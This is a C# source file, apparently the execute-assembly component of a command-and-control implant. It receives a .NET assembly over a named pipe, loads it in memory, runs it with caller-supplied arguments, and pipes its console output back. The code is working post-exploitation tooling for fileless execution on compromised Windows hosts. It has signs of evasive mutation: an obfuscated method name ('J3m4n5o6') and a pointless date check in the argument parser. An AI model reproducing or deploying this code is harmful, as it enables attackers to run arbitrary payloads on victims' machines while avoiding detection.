using PhantomInterop.Classes;
using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Events;
using PhantomInterop.Classes.IO;
using PhantomInterop.Constants;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Interfaces;
using PhantomInterop.Serializers;
using PhantomInterop.Structs.PhantomStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace ExecuteAssembly
{
    class Runtime
    {

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
           [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
           out int pNumArgs);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        private static JsonHandler _dataSerializer = new JsonHandler();
        private static string? _namedPipeName;
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<ICommandMessage> _recieverQueue = new ConcurrentQueue<ICommandMessage>();
        private static AsyncNamedPipeServer? _server;
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object>? _transmitAction;
        private static ST.Task? _clientConnectedTask;

        public static void J3m4n5o6(string[] args)
        {
            
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _transmitAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _msgSendEvent,
                        _cts.Token.WaitHandle
                    });
                    while (_msgSendQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, ProcessSentMessage, pipe);
                    }
                }

                while (_msgSendQueue.TryDequeue(out byte[] message))
                {
                    pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                }

                
                pipe.WaitForPipeDrain();
                pipe.Close();
            };

            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += ProcessReceivedMessage;
            _msgRecvEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out ICommandMessage asmArgs))
            {
                if (asmArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {asmArgs.GetTypeCode()}");
                }
                TextWriter originalStdout = Console.Out;
                TextWriter originalStderr = Console.Error;

                IPCCommandArguments command = (IPCCommandArguments)asmArgs;
                EventableStringWriter stdoutSw = new EventableStringWriter();
                EventableStringWriter stderrSw = new EventableStringWriter();

                stdoutSw.BufferWritten += OnBufferWrite;
                stderrSw.BufferWritten += OnBufferWrite;

                Console.SetOut(stdoutSw);
                Console.SetError(stderrSw);

                try
                {
                    Assembly asm = Assembly.Load(command.ByteData);
                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                    if (costuraLoader != null)
                    {
                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
                        costuraLoaderMethod.Invoke(null, new object[] { });
                    }

                    asm.EntryPoint.Invoke(null, new object[] { ParseCommandLine(command.StringData) });
                }
                catch (TargetInvocationException ex)
                {
                    Exception inner = ex.InnerException;
                    Console.WriteLine($"\nUnhandled Exception: {inner}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Unhandled exception from assembly loader: {ex.Message}");
                }
                finally
                {
                    Console.SetOut(originalStdout);
                    Console.SetError(originalStderr);
                }
            }

            _cts.Cancel();

            
            while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
            {
                task.Wait(1000);
            }
        }

        private static string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = CommandLineToArgvW(cmdline, out numberOfArgs);

            
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            
            try
            {
                splitArgs = new string[numberOfArgs];

                
                
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                if(DateTime.Now.Year > 2020) { return splitArgs; } else { return null; }
            }
            finally
            {
                
                LocalFree(ptrToSplitArgs);
            }
        }

        private static void OnBufferWrite(object sender, StringDataEventArgs args)
        {
            if (args.Data != null)
            {
                try
                {
                    _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(args.Data));
                    _msgSendEvent.Set();
                }
                catch { }

            }
        }

        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }

        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            
            _recieverQueue.Enqueue(msg);
            _msgRecvEvent.Set();
        }

        public static void OnAsyncConnect(object sender, PipeMessageData args)
        {
            
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_transmitAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
